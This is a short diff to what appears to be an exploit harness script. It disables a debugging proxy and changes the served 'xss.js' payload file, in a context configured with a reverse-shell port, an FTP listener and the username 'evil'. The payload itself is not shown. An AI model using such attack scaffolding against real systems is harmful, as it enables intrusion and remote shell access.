@@ -75,13 +75,14 @@ if __name__ == "__main__":
         'lport_reverse': 4444,
         'lport_ftp': 2121,
         'username': 'evil',
-        'proxy': {'http': 'http://127.0.0.1:8080'},
+        'proxy': {},
+        # 'proxy': {'http': 'http://127.0.0.1:8080'},  # In case you'd like to watch it live
         'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
     }
 
     httpd = services.HTTPStatic({
         '/': 'This is home page...',
-        '/xss.js': open(os.path.join(os.path.dirname(__file__), 'xss.js.template')).read().format(**context),
+        '/xss.js': open(os.path.join(os.path.dirname(__file__), 'xss.js')).read().format(**context),
         '/timestamp': services.HTTPStatic.timestamp,
     })
     httpd.set_state('xss', when=triggers.PathContains('xss.js'))
